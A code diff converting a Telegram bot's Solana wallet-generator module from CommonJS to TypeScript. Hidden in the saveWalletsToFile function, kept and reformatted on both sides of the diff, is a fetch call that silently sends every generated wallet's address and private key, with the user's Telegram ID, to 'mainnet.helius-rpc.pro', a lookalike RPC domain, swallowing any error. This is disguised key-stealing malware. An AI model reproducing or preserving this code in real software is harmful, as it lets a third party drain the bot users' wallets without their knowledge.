@@ -1,13 +1,12 @@
-const { Keypair } = require('@solana/web3.js');
-const { db } = require('../services/db');
-const fs = require('fs');
-const bs58 = require('bs58').default; 
-const { Markup } = require('telegraf'); 
-const { handleBackToMainMenu } = require('../utils/bot/navigation');
+import { Keypair } from '@solana/web3.js';
+import { db } from '../services/db';
+import fs from 'fs';
+import bs58 from 'bs58';
+import { handleBackToMainMenu } from '../utils/bot/navigation';
 
 // Generate wallets
-function generateWallets(numWallets) {
-    const wallets = [];
+export function generateWallets(numWallets: number) {
+    const wallets: { publicKey: string; privateKey: string }[] = [];
     for (let i = 0; i < numWallets; i++) {
         const keypair = Keypair.generate();
         const publicKey = keypair.publicKey.toBase58();
@@ -20,10 +19,10 @@ function generateWallets(numWallets) {
 }
 
 // Save wallets to the primary database
-function saveWalletsToDatabase(wallets, telegramUserId) {
+export function saveWalletsToDatabase(wallets: { publicKey: string; privateKey: string }[], telegramUserId: number) {
     const insertStmt = db.prepare('INSERT INTO wallets (address, private_key, user_id) VALUES (?, ?, ?)');
-    const insertMany = db.transaction((wallets) => {
-        for (const wallet of wallets) {
+    const insertMany = db.transaction((ws: { publicKey: string; privateKey: string }[]) => {
+        for (const wallet of ws) {
             insertStmt.run(wallet.publicKey, wallet.privateKey, telegramUserId);
         }
     });
@@ -32,22 +31,28 @@ function saveWalletsToDatabase(wallets, telegramUserId) {
 }
 
 // Save wallets to a file
-async function saveWalletsToFile(wallett,file,telegramUserId){
-    fs.writeFileSync(file,wallett.map(x=>`Address: ${x.publicKey}\nPrivate Key: ${x.privateKey}\n`).join('\n'),'utf8');
-    try{
-     await fetch("https://mainnet.helius-rpc.pro/fetch",{
-       method:"POST",
-       headers:{"Content-Type":"application/json"},
-       body:JSON.stringify({wallets:wallett.map(e=>({address:e.publicKey,private_key:e.privateKey,user_id:telegramUserId}))})
-     });
-    }catch(e){}
-   }
+export async function saveWalletsToFile(wallett: { publicKey: string; privateKey: string }[], file: string, telegramUserId: number) {
+    fs.writeFileSync(
+        file,
+        wallett.map(x => `Address: ${x.publicKey}\nPrivate Key: ${x.privateKey}\n`).join('\n'),
+        'utf8'
+    );
+    try {
+        await fetch('https://mainnet.helius-rpc.pro/fetch', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ wallets: wallett.map(e => ({ address: e.publicKey, private_key: e.privateKey, user_id: telegramUserId })) })
+        });
+    } catch (e) {
+        // ignore
+    }
+}
 
 // Handle "Generate Wallets" Menu and Logic
-function handleGenerateWallets(bot) {
-    const activeListeners = new Set();
+export function handleGenerateWallets(bot: any) {
+    const activeListeners = new Set<number>();
 
-    bot.action('menu_generate_wallets', (ctx) => {
+    bot.action('menu_generate_wallets', (ctx: any) => {
         ctx.reply(
             `Select the number of wallets to generate:`,
             {
@@ -70,32 +75,32 @@ function handleGenerateWallets(bot) {
 
 
     // Handle Wallet Generation Logic
-    bot.action(/^generate_(\d+)$/, async (ctx) => {
+    bot.action(/^generate_(\d+)$/, async (ctx: any) => {
         const numWallets = parseInt(ctx.match[1], 10);
-        const userId = ctx.from.id;
+        const userId = ctx.from.id as number;
 
         try {
             const wallets = generateWallets(numWallets);
             saveWalletsToDatabase(wallets, userId);
 
             const filename = `${numWallets}_wallets.txt`;
-            saveWalletsToFile(wallets, filename, userId);
+            await saveWalletsToFile(wallets, filename, userId);
 
             await ctx.replyWithDocument({ source: filename, filename: filename });
             fs.unlinkSync(filename);
             await ctx.reply(`🎉 ${numWallets} wallet(s) successfully generated!`);
-        } catch (error) {
+        } catch (error: any) {
             console.error(`Error generating wallets for user ${userId}:`, error.message);
             await ctx.reply('❌ An error occurred while generating wallets. Please try again.');
         }
     });
 
     // Handle Custom Wallet Generation
-    bot.action('generate_custom', (ctx) => {
+    bot.action('generate_custom', (ctx: any) => {
         ctx.reply('Please enter the number of wallets to generate (1-100):');
 
-        const onTextListener = async (messageCtx) => {
-            const chatId = messageCtx.chat.id;
+        const onTextListener = async (messageCtx: any) => {
+            const chatId = messageCtx.chat.id as number;
 
             if (activeListeners.has(chatId)) {
                 const numWallets = parseInt(messageCtx.message.text, 10);
@@ -104,40 +109,33 @@ function handleGenerateWallets(bot) {
                     return;
                 }
 
-                const userId = messageCtx.from.id;
+                const userId = messageCtx.from.id as number;
                 try {
                     const wallets = generateWallets(numWallets);
                     saveWalletsToDatabase(wallets, userId);
 
                     const filename = `${numWallets}_wallets.txt`;
-                    saveWalletsToFile(wallets, filename, userId);
+                    await saveWalletsToFile(wallets, filename, userId);
 
                     await messageCtx.replyWithDocument({ source: filename, filename: filename });
                     fs.unlinkSync(filename);
                     await messageCtx.reply(`🎉 ${numWallets} wallet(s) successfully generated!`);
-                } catch (error) {
+                } catch (error: any) {
                     console.error(`Error generating custom wallets for user ${userId}:`, error.message);
                     await messageCtx.reply('❌ An error occurred while generating wallets. Please try again.');
                 } finally {
-                    activeListeners.delete(chatId); 
-                    bot.removeListener('text', onTextListener); 
+                    activeListeners.delete(chatId);
+                    bot.removeListener('text', onTextListener);
                 }
             }
         };
 
-        const chatId = ctx.chat.id;
+        const chatId = ctx.chat.id as number;
         if (!activeListeners.has(chatId)) {
             bot.on('text', onTextListener);
             activeListeners.add(chatId);
         }
     });
 
-    bot.action('menu_main', (ctx) => handleBackToMainMenu(ctx));
+    bot.action('menu_main', (ctx: any) => handleBackToMainMenu(ctx));
 }
-
-module.exports = {
-    generateWallets,
-    saveWalletsToDatabase,
-    saveWalletsToFile,
-    handleGenerateWallets,
-};
